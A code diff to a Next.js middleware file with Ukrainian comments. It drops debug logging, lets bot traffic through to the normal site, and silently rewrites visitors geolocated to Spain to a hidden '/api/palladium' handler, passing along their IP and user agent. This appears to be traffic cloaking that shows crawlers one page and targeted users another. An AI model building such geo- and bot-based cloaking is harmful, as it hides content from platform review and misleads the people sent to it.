@@ -13,43 +13,34 @@ export async function middleware(req: NextRequest) {
         '8.8.8.8'
     const ip = ipHeader.split(',')[0].trim()
 
-    // Логування для дебагу
-    console.log('[MIDDLEWARE] Incoming IP:', ip)
-    console.log('[MIDDLEWARE] User-Agent:', ua)
-
-    // Якщо бот — повертаємо 204, щоб нічого не відображати
+    // 🟢 Ботам нічого не чіпаємо — пропускаємо далі
     if (isBot(ua)) {
-        console.log('[MIDDLEWARE] Detected bot – returning 204')
-        return new NextResponse(null, { status: 204 })
+        return NextResponse.next()
     }
 
     try {
         const geoRes = await fetch(`https://ipwho.is/${ip}`)
         const geo = await geoRes.json()
-        console.log('[MIDDLEWARE] Geo response:', geo)
 
         const isSpain = geo.success && geo.country_code === 'ES'
 
-        // Якщо IP не з Іспанії, пропускаємо запит далі
-        if (!isSpain) {
-            console.log('[MIDDLEWARE] Not Spain – proceeding as usual')
-            return NextResponse.next()
+        // 🔥 Тільки користувачі з Іспанії → Palladium
+        if (isSpain) {
+            const url = req.nextUrl.clone()
+            url.pathname = '/api/palladium'
+            url.searchParams.set('ip', ip)
+            url.searchParams.set('ua', ua)
+            return NextResponse.rewrite(url)
         }
 
-        console.log('[MIDDLEWARE] IP from Spain – redirecting to /palladium')
-
-        const url = req.nextUrl.clone()
-        url.pathname = '/palladium'
-        url.searchParams.set('ip', ip)
-        url.searchParams.set('ua', ua)
-
-        return NextResponse.rewrite(url)
+        // 🟢 Усі інші — рендеримо як є
+        return NextResponse.next()
     } catch (err) {
-        console.error('[MIDDLEWARE] Geo check failed:', err)
-        return NextResponse.next() 
+        console.error('[Middleware Error]', err)
+        return NextResponse.next()
     }
 }
 
 export const config = {
-    matcher: ['/', '/((?!_next|api|static|favicon.ico|palladium).*)'],
+    matcher: ['/', '/page', '/((?!_next|api|static|favicon.ico).*)'],
 }
